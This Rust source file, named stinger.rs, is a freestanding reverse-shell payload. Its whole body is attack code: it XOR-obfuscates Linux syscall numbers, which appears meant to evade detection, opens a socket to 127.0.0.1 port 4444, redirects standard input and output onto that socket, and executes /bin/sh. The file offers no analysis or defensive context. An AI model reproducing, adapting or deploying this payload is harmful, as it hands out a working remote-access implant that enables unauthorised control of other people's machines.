// stinger.rs 
#![no_std]
#![no_main]

use core::panic::PanicInfo;

extern "C" {
    fn vfs_call(n: i64, a1: i64, a2: i64, a3: i64, a4: i64, a5: i64) -> i64;
}

// XOR keys and Syscall numbers (0xAA = 170)
const SYS_SOCKET: i64  = 41 ^ 0xAA;  // 41 ^ 170 = 155
const SYS_CONNECT: i64 = 42 ^ 0xAA;  // 42 ^ 170 = 152
const SYS_DUP2: i64    = 33 ^ 0xAA;  // 33 ^ 170 = 139
const SYS_EXECVE: i64  = 59 ^ 0xAA;  // 59 ^ 170 = 129

#[no_mangle]
pub extern "C" fn _start() -> ! {
    unsafe {
        let fd = vfs_call(SYS_SOCKET, 2, 1, 0, 0, 0);
        if fd < 0 { vfs_exit(); }
 
        // 0x0200 (AF_INET) | 0x115C (Port 4444) | 0x7F000001 (127.0.0.1)
        let sockaddr: [u8; 16] = [
            0x02, 0x00,             // AF_INET
            0x11, 0x5C,             // Port 4444
            0x7F, 0x00, 0x00, 0x01, // IP 127.0.0.1
            0, 0, 0, 0, 0, 0, 0, 0  // Padding
        ];

        let conn = vfs_call(SYS_CONNECT, fd, sockaddr.as_ptr() as i64, 16, 0, 0);
        if conn < 0 { vfs_exit(); }

        vfs_call(SYS_DUP2, fd, 0, 0, 0, 0); // stdin
        vfs_call(SYS_DUP2, fd, 1, 0, 0, 0); // stdout
        vfs_call(SYS_DUP2, fd, 2, 0, 0, 0); // stderr

        let bin_sh = b"/bin/sh\0";
        vfs_call(SYS_EXECVE, bin_sh.as_ptr() as i64, 0, 0, 0, 0);
    }
    vfs_exit();
}

unsafe fn vfs_exit() -> ! {
    vfs_call(60 ^ 0xAA, 0, 0, 0, 0, 0); // Syscall Exit (60)
    loop {}
}

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! { loop {} }